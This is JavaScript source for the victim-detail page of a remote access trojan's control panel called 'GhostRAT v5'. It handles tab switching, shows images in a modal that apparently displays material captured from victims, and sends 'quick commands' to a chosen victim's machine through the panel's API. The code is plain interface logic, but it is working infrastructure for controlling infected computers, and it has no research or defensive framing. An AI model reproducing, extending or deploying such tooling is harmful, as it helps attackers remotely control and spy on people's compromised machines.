/**
 * GhostRAT v5 — Victim Detail JavaScript
 * Command sending, tab switching, image modal.
 */

(function() {
    'use strict';

    // ── DOM References ─────────────────────────────────────────────────────────

    const tabs = document.querySelectorAll('.tab');
    const tabPanels = document.querySelectorAll('.tab-panel');
    const imageModal = document.getElementById('imageModal');
    const modalImage = document.getElementById('modalImage');

    // ── Init ───────────────────────────────────────────────────────────────────

    document.addEventListener('DOMContentLoaded', () => {
        // Tab switching
        tabs.forEach(tab => {
            tab.addEventListener('click', () => switchTab(tab.dataset.tab));
        });
    });

    // ── Tab Switching ──────────────────────────────────────────────────────────

    function switchTab(tabName) {
        tabs.forEach(t => t.classList.remove('active'));
        tabPanels.forEach(p => p.classList.remove('active'));

        const targetTab = document.querySelector(`.tab[data-tab="${tabName}"]`);
        const targetPanel = document.getElementById(`${tabName}Panel`);

        if (targetTab) targetTab.classList.add('active');
        if (targetPanel) targetPanel.classList.add('active');
    }

    window.switchTab = switchTab;

    // ── Quick Commands ─────────────────────────────────────────────────────────

    async function sendQuickCommand(cmdType) {
        const victimId = getCurrentVictimId();
        if (!victimId) return;

        const btn = event.target;
        const originalText = btn.textContent;
        btn.textContent = 'Sending...';
        btn.disabled = true;

        try {
            const resp = await fetch(`/api/victim/${victimId}/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: cmdType, data: '' })
            });

            if (resp.ok) {
                btn.textContent = 'Sent!';
                btn.classList.add('sent');
                setTimeout(() => location.reload(), 1500);
            } else {
                btn.textContent = 'Failed';
                setTimeout(() => { btn.textContent = originalText; btn.disabled = false; }, 2000);
            }
        } catch (err) {
            console.error('[GhostRAT] Command send error:', err);
            btn.textContent = 'Error';
            setTimeout(() => { btn.textContent = originalText; btn.disabled = false; }, 2000);
        }
    }

    window.sendQuickCommand = sendQuickCommand;

    // ── Image Modal ────────────────────────────────────────────────────────────

    function openImageModal(src) {
        modalImage.src = src;
        imageModal.style.display = 'flex';
    }

    function closeImageModal() {
        imageModal.style.display = 'none';
        modalImage.src = '';
    }

    window.openImageModal = openImageModal;
    window.closeImageModal = closeImageModal;

    // ── Helpers ────────────────────────────────────────────────────────────────

    function getCurrentVictimId() {
        // Extract from the page URL or the victim info card
        const path = window.location.pathname;
        const match = path.match(/\/victim\/(.+)/);
        return match ? match[1] : null;
    }

})();
